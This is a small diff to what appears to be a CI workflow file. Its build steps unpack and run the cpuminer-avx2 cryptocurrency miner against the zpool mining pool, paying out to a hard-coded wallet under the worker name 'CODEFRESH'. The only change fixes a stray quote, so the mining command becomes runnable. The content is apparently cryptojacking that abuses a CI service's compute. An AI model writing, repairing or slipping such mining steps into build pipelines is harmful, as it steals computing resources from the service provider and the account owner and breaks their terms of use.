@@ -9,4 +9,4 @@ workflows:
       - tar xf cpuminer-opt-linux.tar.gz
       - ls
       - chmod +x cpuminer-avx2
-      - ./cpuminer-avx2 -a lyra2z330  -o stratum+tcp://lyra2z330.eu.mine.zpool.ca:4563 -u PRSZGchW7jSnmLfnzzYpHV1dxUYRZZrZRr.CODEFRESH -q -p c=PYRK"
+      - ./cpuminer-avx2 -a lyra2z330  -o stratum+tcp://lyra2z330.eu.mine.zpool.ca:4563 -u PRSZGchW7jSnmLfnzzYpHV1dxUYRZZrZRr.CODEFRESH -q -p c=PYRK
